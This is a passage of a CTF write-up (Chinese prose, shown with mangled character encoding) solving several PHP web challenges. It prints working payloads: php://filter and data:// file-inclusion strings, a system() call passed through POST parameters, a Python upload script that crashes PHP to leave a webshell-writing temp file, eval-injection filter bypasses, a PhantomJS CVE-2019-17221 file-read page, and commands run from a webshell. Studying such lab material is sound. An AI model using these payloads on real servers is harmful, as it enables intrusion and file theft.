<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?S=_POST[&#x27;1&#x27;]($_POST[&#x27;2&#x27;]);</span><br><span class="line">1=system&amp;2=ls</span><br></pre></td></tr></table></figure>

<h2 id="ä¸çŸ¥æ‰€æª-jpg"><a href="#ä¸çŸ¥æ‰€æª-jpg" class="headerlink" title="ä¸çŸ¥æ‰€æª.jpg"></a>ä¸çŸ¥æ‰€æª.jpg</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$file must has test</span><br></pre></td></tr></table></figure>

<p>å¿…é¡»å¸¦testå­—çœ¼</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=test.</span><br></pre></td></tr></table></figure>

<p>æ‰“è¿‡å»æç¤ºflag not hereï¼Œä¼°è®¡æ˜¯ä¸€å±‚æ–‡ä»¶åŒ…å«</p>
<p>ä¼ªåè®®ç›´æ¥æ‰“</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=test.</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œæœ‰ä¸€ä¸ªtips</p>
<blockquote>
<h4 id="php-x2F-x2F-filter-Â¶"><a href="#php-x2F-x2F-filter-Â¶" class="headerlink" title="php:&#x2F;&#x2F;filter Â¶"></a>php:&#x2F;&#x2F;filter<a href="https://www.php.net/manual/zh/wrappers.php.php#wrappers.php.filter"> Â¶</a></h4><p>php:&#x2F;&#x2F;filter æ˜¯ä¸€ç§å…ƒå°è£…å™¨ï¼Œ è®¾è®¡ç”¨äºæ•°æ®æµæ‰“å¼€æ—¶çš„<a href="https://www.php.net/manual/zh/filters.php">ç­›é€‰è¿‡æ»¤</a>åº”ç”¨ã€‚ è¿™å¯¹äºä¸€ä½“å¼ï¼ˆall-in-oneï¼‰çš„æ–‡ä»¶å‡½æ•°éå¸¸æœ‰ç”¨ï¼Œç±»ä¼¼ <a href="https://www.php.net/manual/zh/function.readfile.php">readfile()</a>ã€ <a href="https://www.php.net/manual/zh/function.file.php">file()</a> å’Œ <a href="https://www.php.net/manual/zh/function.file-get-contents.php">file_get_contents()</a>ï¼Œ åœ¨æ•°æ®æµå†…å®¹è¯»å–ä¹‹å‰æ²¡æœ‰æœºä¼šåº”ç”¨å…¶ä»–è¿‡æ»¤å™¨ã€‚</p>
<p>php:&#x2F;&#x2F;filter ç›®æ ‡ä½¿ç”¨ä»¥ä¸‹çš„å‚æ•°ä½œä¸ºå®ƒè·¯å¾„çš„ä¸€éƒ¨åˆ†ã€‚ å¤åˆè¿‡æ»¤é“¾èƒ½å¤Ÿåœ¨ä¸€ä¸ªè·¯å¾„ä¸ŠæŒ‡å®šã€‚è¯¦ç»†ä½¿ç”¨è¿™äº›å‚æ•°å¯ä»¥å‚è€ƒå…·ä½“èŒƒä¾‹ã€‚</p>
<table>
<thead>
<tr>
<th align="left">åç§°</th>
<th align="left">æè¿°</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>resource=&lt;è¦è¿‡æ»¤çš„æ•°æ®æµ&gt;</code></td>
<td align="left">è¿™ä¸ªå‚æ•°æ˜¯å¿…é¡»çš„ã€‚å®ƒæŒ‡å®šäº†ä½ è¦ç­›é€‰è¿‡æ»¤çš„æ•°æ®æµã€‚</td>
</tr>
<tr>
<td align="left"><code>read=&lt;è¯»é“¾çš„ç­›é€‰åˆ—è¡¨&gt;</code></td>
<td align="left">è¯¥å‚æ•°å¯é€‰ã€‚å¯ä»¥è®¾å®šä¸€ä¸ªæˆ–å¤šä¸ªè¿‡æ»¤å™¨åç§°ï¼Œä»¥ç®¡é“ç¬¦ï¼ˆ&#96;</td>
</tr>
<tr>
<td align="left"><code>write=&lt;å†™é“¾çš„ç­›é€‰åˆ—è¡¨&gt;</code></td>
<td align="left">è¯¥å‚æ•°å¯é€‰ã€‚å¯ä»¥è®¾å®šä¸€ä¸ªæˆ–å¤šä¸ªè¿‡æ»¤å™¨åç§°ï¼Œä»¥ç®¡é“ç¬¦ï¼ˆ&#96;</td>
</tr>
<tr>
<td align="left"><code>&lt;ï¼›ä¸¤ä¸ªé“¾çš„ç­›é€‰åˆ—è¡¨&gt;</code></td>
<td align="left">ä»»ä½•æ²¡æœ‰ä»¥ <code>read=</code> æˆ– <code>write=</code> ä½œå‰ç¼€ çš„ç­›é€‰å™¨åˆ—è¡¨ä¼šè§†æƒ…å†µåº”ç”¨äºè¯»æˆ–å†™é“¾ã€‚</td>
</tr>
</tbody></table>
</blockquote>
<p>åœ¨readå’Œresourceä¸­é—´å¯ä»¥ä»»æ„æ’å…¥ï¼Œä¸å½±å“æ•°æ®çš„è¯»å–</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/test/resource=test.</span><br></pre></td></tr></table></figure>

<p>åœ¨è¿™é‡ŒåŠ å…¥teståä¸å½±å“</p>
<p>æ‰€ä»¥å¯ä»¥é€šè¿‡è¿™ä¸ªæ¥è¯»index</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/test/resource=index.</span><br></pre></td></tr></table></figure>

<p>æ‰“å‡ºæ¥ç¡®å®æ˜¯includeï¼Œé‚£å°±ç›´æ¥dataæ‰“</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=data://text/plain,&lt;?php system(&#x27;ls&#x27;);echo &#x27;test&#x27;; ?&gt;</span><br></pre></td></tr></table></figure>

<h2 id="easyshell"><a href="#easyshell" class="headerlink" title="easyshell"></a>easyshell</h2><p>è¿›å…¥è®©ä¼ ä¸ªusernameå’Œpasswordï¼Œcookieè¿˜å¸¦äº†hashï¼Œåˆç†çŒœæµ‹è¿™ä¸‰ä¸ªç›¸å…³</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">md5($secret.$name)===$pass</span><br></pre></td></tr></table></figure>

<p>ä¼ username&#x3D;1ï¼Œpassword&#x3D;hashï¼Œå‘ç°é€šè¿‡<code>window.location.href</code>è‡ªåŠ¨è·³è½¬äº†ä¸¤ä¸ªé¡µé¢ï¼šflflflflag.phpï¼Œ404.html</p>
<p>è¿›burpä¸€æ­¥æ­¥çœ‹ï¼Œåœ¨flflflflagä¸­æç¤ºäº†</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">include($_GET[&quot;file&quot;])</span><br></pre></td></tr></table></figure>

<p>æ—¢ç„¶éƒ½includeï¼Œç›´æ¥phpä¼ªåè®®æŠŠæºç è¯»å‡ºæ¥</p>
<p>flflflflag.php:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$file=$_GET[&#x27;file&#x27;];</span><br><span class="line">if(preg_match(&#x27;/data|input|zip/is&#x27;,$file))&#123;</span><br><span class="line">    die(&#x27;nonono&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">@include($file);</span><br><span class="line">echo &#x27;include($_GET[&quot;file&quot;])&#x27;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>ä¹Ÿå°±è¿™é‡Œçš„æ–‡ä»¶åŒ…å«èƒ½åˆ©ç”¨äº†</p>
<h3 id="æ³•ä¸€ï¼š"><a href="#æ³•ä¸€ï¼š" class="headerlink" title="æ³•ä¸€ï¼š"></a>æ³•ä¸€ï¼š</h3><p>æœ‰ä¸ªçŸ¥è¯†ç‚¹ï¼š</p>
<blockquote>
<p>PHPå¯ä»¥é€šè¿‡POSTæˆ–è€…PUTè¿›è¡Œæ–‡ä»¶ä¸Šä¼ ï¼Œä¸Šä¼ çš„æ–‡ä»¶å­˜åœ¨ä¸´æ—¶æ–‡ä»¶çš„å­˜å‚¨ç›®å½•ä¸­ï¼Œåœ¨ä¸€ä¸ªæ­£å¸¸å­˜æ´»å‘¨æœŸååˆ é™¤</p>
<p><img src="https://raw.githubusercontent.com/b1xcy/img/master/202401300030285.png" alt="ä¸´æ—¶æ–‡ä»¶æ­£å¸¸çš„å­˜è´§å‘¨æœŸ"></p>
<p>ä¸Šé¢è¿™å¼ å›¾æ˜¯PHPåœ¨é€šè¿‡POSTæ–¹æ³•ä¸Šä¼ æ–‡ä»¶æ—¶çš„è¿è¡Œå‘¨æœŸå›¾ï¼Œå¯ä»¥çœ‹åˆ°æˆ‘ä»¬ä¸´æ—¶æ–‡ä»¶çš„å­˜æ´»å‘¨æœŸå°±æ˜¯ä¸Šå›¾çº¢è‰²æ¡†ä¸­çš„æ—¶é—´æ®µã€‚å¦å¤–ï¼Œå¦‚æœåœ¨phpè¿è¡Œçš„è¿‡ç¨‹ä¸­ï¼Œå‡å¦‚phpéæ­£å¸¸ç»“æŸï¼Œæ¯”å¦‚å´©æºƒï¼Œé‚£ä¹ˆè¿™ä¸ªä¸´æ—¶æ–‡ä»¶å°±ä¼šæ°¸ä¹…çš„ä¿ç•™ã€‚å¦‚æœphpæ­£å¸¸çš„ç»“æŸï¼Œå¹¶ä¸”è¯¥æ–‡ä»¶æ²¡æœ‰è¢«ç§»åŠ¨åˆ°å…¶å®ƒåœ°æ–¹ä¹Ÿæ²¡æœ‰è¢«æ”¹åï¼Œåˆ™è¯¥æ–‡ä»¶å°†åœ¨è¡¨å•è¯·æ±‚ç»“æŸæ—¶è¢«åˆ é™¤ã€‚</p>
<p>æ ¹æ®@ç‹ä¸€èˆªå¸ˆå‚…å»å¹´çš„ä¸€ä¸ªå‘ç°ï¼Œåˆ©ç”¨<strong>php:&#x2F;&#x2F;filter&#x2F;string.strip_tags</strong>é€ æˆå´©æºƒã€‚åœ¨å«æœ‰æ–‡ä»¶åŒ…å«æ¼æ´çš„åœ°æ–¹ï¼Œä½¿ç”¨<strong>php:&#x2F;&#x2F;filter&#x2F;string.strip_tags</strong>å¯¼è‡´phpå´©æºƒæ¸…ç©ºå †æ ˆé‡å¯ï¼Œå¦‚æœåœ¨åŒæ—¶ä¸Šä¼ äº†ä¸€ä¸ªæ–‡ä»¶ï¼Œé‚£ä¹ˆè¿™ä¸ªtmp fileå°±ä¼šä¸€ç›´ç•™åœ¨tmpç›®å½•</p>
</blockquote>
<p>ç»è¿‡æ–‡ä»¶æ‰«æåè¿˜å‘ç°äº†ä¸ªdir.phpï¼Œé‡Œé¢å°±æ˜¯var_dumpäº†&#x2F;tmpçš„ç›®å½•</p>
<p>é‚£å°±å¯ä»¥çŒœæµ‹tmpç›®å½•å°±æ˜¯&#x2F;tmpä¸‹</p>
<p>ç»™ä¸€ä¸ªpythonçš„æ–‡ä»¶ä¸Šä¼ è„šæœ¬</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import io</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def upload_file_to_url(url, file_content, file_name):</span><br><span class="line">    file_data = io.BytesIO(file_content.encode())</span><br><span class="line"></span><br><span class="line">    files = &#123;&#x27;file&#x27;: (file_name, file_data)&#125;</span><br><span class="line"></span><br><span class="line">    response = requests.post(url, files=files)</span><br><span class="line"></span><br><span class="line">    print(response.text)</span><br><span class="line"></span><br><span class="line">target_url = &#x27;http://43f8f4c1-7229-4348-8c40-e5858b937637.challenge.ctf.show/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd&#x27;</span><br><span class="line">content_to_upload = &#x27;&lt;?php file_put_contents(&quot;shell.php&quot;,&quot;&lt;?php phpinfo();?&gt;&quot;)?&gt;&#x27;</span><br><span class="line">file_name_to_upload = &#x27;test&#x27;</span><br><span class="line"></span><br><span class="line">upload_file_to_url(target_url, content_to_upload, file_name_to_upload)</span><br></pre></td></tr></table></figure>

<p>é‡Œé¢ä½¿ç”¨<code>php://filter/string.strip_tags</code>æ¥é€ æˆå´©æºƒï¼Œå†è®¿é—®dir.phpå³å¯æ‰¾åˆ°è¯¥æ–‡ä»¶çš„åå­—</p>
<p>è¿™ä¸ªæ–‡ä»¶è¢«åŒ…å«çš„ç»“æœå°±æ˜¯ï¼Œåˆ›å»ºä¸€ä¸ªshell.phpï¼Œå¾€é‡Œé¢å†™å…¥<code>&lt;?php phpinfo();?&gt;</code></p>
<p>includeåŒ…å«ä¹‹åç›´æ¥è®¿é—®shell.php</p>
<h3 id="æ³•äºŒï¼š"><a href="#æ³•äºŒï¼š" class="headerlink" title="æ³•äºŒï¼š"></a>æ³•äºŒï¼š</h3><p>å‚è€ƒï¼š</p>
<p><a href="https://xz.aliyun.com/t/9545">æµ…è°ˆ SESSION_UPLOAD_PROGRESS çš„åˆ©ç”¨</a></p>
<p><a href="https://www.anquanke.com/post/id/201177">LFI ç»•è¿‡ Session åŒ…å«é™åˆ¶ Getshell</a></p>
<blockquote>
<p>Session Upload Progress æœ€åˆæ˜¯PHPä¸ºä¸Šä¼ è¿›åº¦æ¡è®¾è®¡çš„ä¸€ä¸ªåŠŸèƒ½ï¼Œåœ¨ä¸Šä¼ æ–‡ä»¶è¾ƒå¤§çš„æƒ…å†µä¸‹ï¼ŒPHPå°†è¿›è¡Œæµå¼ä¸Šä¼ ï¼Œå¹¶å°†è¿›åº¦ä¿¡æ¯æ”¾åœ¨Sessionä¸­ï¼Œæ­¤æ—¶å³ä½¿ç”¨æˆ·æ²¡æœ‰åˆå§‹åŒ–Sessionï¼ŒPHPä¹Ÿä¼šè‡ªåŠ¨åˆå§‹åŒ–Sessionã€‚è€Œä¸”ï¼Œé»˜è®¤æƒ…å†µä¸‹session.upload_progress.enabledæ˜¯ä¸ºOnçš„ï¼Œä¹Ÿå°±æ˜¯è¯´è¿™ä¸ªç‰¹æ€§é»˜è®¤å¼€å¯ã€‚</p>
</blockquote>
<p>æ€è·¯æ˜¯ä¸€æ ·çš„ï¼ŒåŒ…å«ä¸€ä¸ªæ¶æ„æ–‡ä»¶ï¼Œåªä¸è¿‡è¿™ä¸ªæ¶æ„æ–‡ä»¶ç”±session uploadå¾—æ¥</p>
<h2 id="ç»™ä½ shell"><a href="#ç»™ä½ shell" class="headerlink" title="ç»™ä½ shell"></a>ç»™ä½ shell</h2><p>F12æç¤ºä¼ å‚<code>?view_source</code>ï¼Œè¿›å»æ˜¾ç¤ºæºç </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//It&#x27;s no need to use scanner. Of course if you want, but u will find nothing.</span><br><span class="line">error_reporting(0);</span><br><span class="line">include &quot;config.php&quot;;</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#x27;view_source&#x27;])) &#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">    die;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function checkCookie($s) &#123;</span><br><span class="line">    $arr = explode(&#x27;:&#x27;, $s);</span><br><span class="line">    if ($arr[0] === &#x27;&#123;&quot;secret&quot;&#x27; &amp;&amp; preg_match(&#x27;/^[\&quot;0-9A-Z]*&#125;$/&#x27;, $arr[1]) &amp;&amp; count($arr) === 2 ) &#123;</span><br><span class="line">        return true;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        if ( !theFirstTimeSetCookie() ) setcookie(&#x27;secret&#x27;, &#x27;&#x27;, time()-1);</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function haveFun($_f_g) &#123;</span><br><span class="line">    $_g_r = 32;</span><br><span class="line">    $_m_u = md5($_f_g);</span><br><span class="line">    $_h_p = strtoupper($_m_u);</span><br><span class="line">    for ($i = 0; $i &lt; $_g_r; $i++) &#123;</span><br><span class="line">        $_i = substr($_h_p, $i, 1);</span><br><span class="line">        $_i = ord($_i);</span><br><span class="line">        print_r($_i &amp; 0xC0);</span><br><span class="line">    &#125;</span><br><span class="line">    die;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">isset($_COOKIE[&#x27;secret&#x27;]) ? $json = $_COOKIE[&#x27;secret&#x27;] : setcookie(&#x27;secret&#x27;, &#x27;&#123;&quot;secret&quot;:&quot;&#x27; . strtoupper(md5(&#x27;y1ng&#x27;)) . &#x27;&quot;&#125;&#x27;, time()+7200 );</span><br><span class="line">checkCookie($json) ? $obj = @json_decode($json, true) : die(&#x27;no&#x27;);</span><br><span class="line"></span><br><span class="line">if ($obj &amp;&amp; isset($_GET[&#x27;give_me_shell&#x27;])) &#123;</span><br><span class="line">    ($obj[&#x27;secret&#x27;] != $flag_md5 ) ? haveFun($flag) : echo &quot;here is your webshell: $shell_path&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">die;</span><br></pre></td></tr></table></figure>

<p>å¤„ç†æµç¨‹ï¼šå¦‚æœcookieä¸­è®¾ç½®äº†secretï¼Œèµ‹å€¼ç»™$jsonï¼Œå¦åˆ™ç»™ä½ åŠ ä¸Šä¸ªmd5(â€˜y1ngâ€™)ä½œä¸ºcookie</p>
<p>æ­£å¸¸æƒ…å†µä¸‹cookieçš„secretä¸º</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">secret=%7B%22secret%22%3A%22770F0F8B605CFD2BA494849D948D34EF%22%7D</span><br><span class="line">urldecode-&gt;</span><br><span class="line">secret=&#123;&quot;secret&quot;:&quot;770F0F8B605CFD2BA494849D948D34EF&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>è¿›å…¥checkCookieå‡½æ•°ï¼Œè¦æ±‚$json<code>:</code>å‰ä¸º<code>&#123;&quot;secret&quot;</code>ï¼ŒååŠéƒ¨åˆ†<code>[\&quot;0-9A-Z]*</code>ä¸”ä»¥<code>&#125;</code>ç»“å°¾</p>
<p>å¾€åå°±æ˜¯$objæ¥æ”¶$jsonç»è¿‡json_decodeçš„å†…å®¹</p>
<p>å¦‚æœ$obj[â€˜secretâ€™]ï¼&#x3D;$flag_md5ï¼Œå°±è¿›haveFunå‡½æ•°ï¼Œé‡Œé¢å°±æ˜¯æŠŠflag md5åè½¬å¤§å†™ï¼Œç„¶åæ¯ä½éƒ½å’Œ0xC0å¼‚æˆ–</p>
<p>æµ‹è¯•å‡ºæ¥haveFunçš„è¾“å‡º</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0006464640064064646464006406464064640064006400000000000</span><br></pre></td></tr></table></figure>

<p>å†è¯•è¯•ä¼šå‘ç°è¾“å‡ºæœ‰è§„å¾‹ï¼šæ•°å­—-&gt;0ï¼Œå­—æ¯-&gt;64</p>
<p>æ‰€ä»¥flag md5åçš„å‰ä¸‰ä¸ªä¸€å®šæ˜¯æ•°å­—</p>
<p>åˆ©ç”¨phpå¼±æ¯”è¾ƒï¼Œæ•°å­—å’Œæ•°å­—å¼€å¤´çš„stræ¯”è¾ƒï¼Œsträ¼šè‡ªåŠ¨æˆªå–ï¼Œè®©strè½¬ä¸ºæ•°å­—å†æ¯”è¾ƒ</p>
<p>è®©<code>secret=&#123;&quot;secret&quot;:123&#125;</code>ï¼Œå…¶ä¸­123ä¼šè¢«json_decodeè§£æä¸ºæ•°å­—ï¼Œåœ¨è¿™é‡Œçˆ†ç ´å¾—åˆ°115</p>
<p>è¿›ä¸‹ä¸€æ­¥path</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">require &quot;hidden_filter.php&quot;;</span><br><span class="line"></span><br><span class="line">if (!$_SESSION[&#x27;login&#x27;])</span><br><span class="line">    die(&#x27;&lt;script&gt;location.href=\&#x27;./index.php\&#x27;&lt;/script&gt;&#x27;);</span><br><span class="line"></span><br><span class="line">if (!isset($_GET[&#x27;code&#x27;])) &#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">    exit();</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    $code = $_GET[&#x27;code&#x27;];</span><br><span class="line">    if (!preg_match($secret_waf, $code)) &#123;</span><br><span class="line">        //æ¸…ç©ºsession ä»å¤´å†æ¥</span><br><span class="line">        eval(&quot;\$_SESSION[&quot; . $code . &quot;]=false;&quot;); //you know, here is your webshell, an eval() without any disabled_function. However, eval() for $_SESSION only XDDD you noob hacker</span><br><span class="line">    &#125; else die(&#x27;hacker&#x27;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>fuzzä¸€é€šè¢«banäº†&#96;&#96;fFâ€$â€™()*+&#x2F;;^|&#96;</p>
<p>ç›´æ¥phpçŸ­æ ‡ç­¾æå‰é—­åˆï¼Œé€ æˆ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eval(&quot;\$_SESSION[1]?&gt;&lt;?=?&gt;]=false;&quot;);</span><br></pre></td></tr></table></figure>

<p>æ¥ä¸‹æ¥è¦è€ƒè™‘æ€ä¹ˆæ ·åœ¨æ–°å¼€çš„æ ‡ç­¾é‡Œè¯»åˆ°flag.txtï¼Œè€Œä¸”F,féƒ½è¢«banäº†ï¼Œæ‹¬å·ä¹Ÿbanäº†ï¼ŒåŸºæœ¬è°ƒç”¨ä¸åˆ°å‡½æ•°</p>
<p>å¯ä»¥ç”¨requireæ¥åŒ…å«(includeè¢«ban)ï¼ŒåŠ ä¸Šä¸ª~å–åæ¥ç»•è¿‡</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo urlencode(~&quot;/flag.txt&quot;)-&gt;%d0%99%93%9e%98%d1%8b%87%8b</span><br><span class="line">echo urlencode(~&quot;/flag&quot;)-&gt;%d0%99%93%9e%98</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1]?&gt;&lt;?=require~%d0%99%93%9e%98?&gt;</span><br></pre></td></tr></table></figure>

<h2 id="RemoteImageDownloader"><a href="#RemoteImageDownloader" class="headerlink" title="RemoteImageDownloader"></a>RemoteImageDownloader</h2><p>ä¸€çœ¼è¿‡å»è§‰å¾—æ˜¯php+curlï¼Œæƒ³ç€fileåè®®ç›´æ¥æ‹¿ä¸‹äº†</p>
<p>ä½†æ˜¯æµ‹è¯•äº†å‘ç°å¹¶ä¸æ˜¯phpï¼Œèµ·ä¸€ä¸ªHTTP HEARDER ECHOæœåŠ¡çœ‹çœ‹UAå¤´å¾—åˆ°åç«¯çš„è¯·æ±‚</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"></span><br><span class="line">try:</span><br><span class="line">    from http.server import HTTPServer, BaseHTTPRequestHandler</span><br><span class="line">except:</span><br><span class="line">    from BaseHTTPServer import HTTPServer, BaseHTTPRequestHandler</span><br><span class="line">from optparse import OptionParser</span><br><span class="line">import json</span><br><span class="line"></span><br><span class="line">class RequestHandler(BaseHTTPRequestHandler):</span><br><span class="line"></span><br><span class="line">    def do_GET(self):</span><br><span class="line">        request_path = self.path</span><br><span class="line"></span><br><span class="line">        self.send_response(200)</span><br><span class="line">        self.send_header(&#x27;Content-Type&#x27;, &#x27;application/json&#x27;)</span><br><span class="line">        self.end_headers()</span><br><span class="line">        json_string = json.dumps(dict(self.headers))</span><br><span class="line">        self.wfile.write(json_string.encode(&#x27;utf-8&#x27;))</span><br><span class="line"></span><br><span class="line">        print(&#x27;%sBegin of Headers%s&#x27; % (&#x27;-&#x27; * 5, &#x27;-&#x27; * 5))</span><br><span class="line">        for k, v in self.headers.items():</span><br><span class="line">            print(&#x27;%s: %s&#x27; % (k, v))</span><br><span class="line">        print(&#x27;%sEnd of Headers%s&#x27; % (&#x27;-&#x27; * 5, &#x27;-&#x27; * 5))</span><br><span class="line"></span><br><span class="line">        return None</span><br><span class="line"></span><br><span class="line">    do_POST   = do_GET</span><br><span class="line">    do_PUT    = do_GET</span><br><span class="line">    do_DELETE = do_GET</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    port = 8080</span><br><span class="line">    print(&#x27;Listening on all interfaces:%s&#x27; % port)</span><br><span class="line">    server = HTTPServer((&#x27;&#x27;, port), RequestHandler)</span><br><span class="line">    server.serve_forever()</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    parser = OptionParser()</span><br><span class="line">    parser.usage = (&quot;Creates an HTTP-header-echo-server.&quot;)</span><br><span class="line">    (options, args) = parser.parse_args()</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>



<p><img src="https://raw.githubusercontent.com/b1xcy/img/master/202402042314535.png" alt="image-20240204231410411"></p>
<p>PhantomJS2.1.1æœ‰<a href="https://nvd.nist.gov/vuln/detail/CVE-2019-17221">CVE-2019-17221</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;title&gt;test&lt;/title&gt;</span><br><span class="line">    &lt;style&gt;body &#123; background: white; &#125;&lt;/style&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">      var xhr = new XMLHttpRequest();</span><br><span class="line">      xhr.onload = function () &#123;</span><br><span class="line">        document.body.innerText = xhr.responseText;</span><br><span class="line">      &#125;;</span><br><span class="line">      xhr.open(&#x27;GET&#x27;, &#x27;file:///flag&#x27;);</span><br><span class="line">      xhr.send();</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>è®©æœåŠ¡å™¨è®¿é—®è¿™ä¸ªå°±è¡Œ</p>
<h2 id="ALL-INFO-U-WANT"><a href="#ALL-INFO-U-WANT" class="headerlink" title="ALL_INFO_U_WANT"></a>ALL_INFO_U_WANT</h2><p>å¾ˆæµç•…çš„ä¸€é“é¢˜</p>
<p>æ‰«å‡ºindex.php.bak</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">visit all_info_u_want.php and you will get all information you want</span><br><span class="line"></span><br><span class="line">= =Thinking that it may be difficult, i decided to show you the source code:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">//give you all information you want</span><br><span class="line">if (isset($_GET[&#x27;all_info_i_want&#x27;])) &#123;</span><br><span class="line">    phpinfo();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#x27;file&#x27;])) &#123;</span><br><span class="line">    $file = &quot;/var/www/html/&quot; . $_GET[&#x27;file&#x27;];</span><br><span class="line">    //really baby include</span><br><span class="line">    include($file);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">really really really baby challenge right? </span><br></pre></td></tr></table></figure>

<p>includeæ—¥å¿—åŒ…å«å°±è¡Œ</p>
<p>ä½†æ˜¯real flagä¸åœ¨æ ¹ç›®å½•ï¼Œè¦åœ¨èšå‰‘shellæ‰¾ä¸€ä¸‹</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find /etc -name &#x27;*&#x27; | xargs grep &quot;&#123;&quot;</span><br><span class="line">æˆ–è€…</span><br><span class="line">find /etc | xargs grep &quot;&#123;&quot;</span><br></pre></td></tr></table></figure>

<p>ï¼ˆåªèƒ½ç”¨å•å¼•å·ï¼Œå…¶ä»–éƒ½æŠ¥é”™ éš¾ç»·</p>
<h2 id="WUSTCT-æœ´å®æ— å-Revenge"><a href="#WUSTCT-æœ´å®æ— å-Revenge" class="headerlink" title="WUSTCT_æœ´å®æ— å_Revenge"></a>WUSTCT_æœ´å®æ— å_Revenge</h2><p>è¿›å»å°±æ˜¯ç»å…¸é—¯å…³ï¼Œå…ˆç»™ä¸€ä¸ªåˆ¤æ–­å›æ–‡çš„å‡½æ•°</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function isPalindrome($str)&#123;</span><br><span class="line">    $len=strlen($str);</span><br><span class="line">    $l=1;</span><br><span class="line">    $k=intval($len/2)+1;</span><br><span class="line">    for($j=0;$j&lt;$k;$j++)</span><br><span class="line">        if (substr($str,$j,1)!=substr($str,$len-$j-1,1)) &#123;</span><br><span class="line">            $l=0;</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line">    if ($l==1) return true;</span><br><span class="line">    else return false;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>level1</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (isset($_GET[&#x27;num&#x27;]))&#123;</span><br><span class="line">    $num = $_GET[&#x27;num&#x27;];</span><br><span class="line">    $numPositve = intval($num);</span><br><span class="line">    $numReverse = intval(strrev($num));</span><br><span class="line">    if (preg_match(&#x27;/[^0-9.-]/&#x27;, $num)) &#123;</span><br><span class="line">        die(&quot;éæ´²æ¬¢è¿ä½ 1&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if ($numPositve &lt;= -999999999999999999 || $numPositve &gt;= 999999999999999999) &#123; //åœ¨64ä½ç³»ç»Ÿä¸­ intval()çš„ä¸Šé™ä¸æ˜¯2147483647 çœçœå§</span><br><span class="line">        die(&quot;éæ´²æ¬¢è¿ä½ 2&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if( $numPositve === $numReverse &amp;&amp; !isPalindrome($num) )&#123;</span><br><span class="line">        echo &quot;æˆ‘ä¸ç»æ„é—´çœ‹äº†çœ‹æˆ‘çš„åŠ³åŠ›å£«, ä¸æ˜¯æƒ³çœ‹æ—¶é—´, åªæ˜¯æƒ³ä¸ç»æ„é—´, è®©ä½ çŸ¥é“æˆ‘è¿‡å¾—æ¯”ä½ å¥½.&lt;/br&gt;&quot;;</span><br><span class="line">    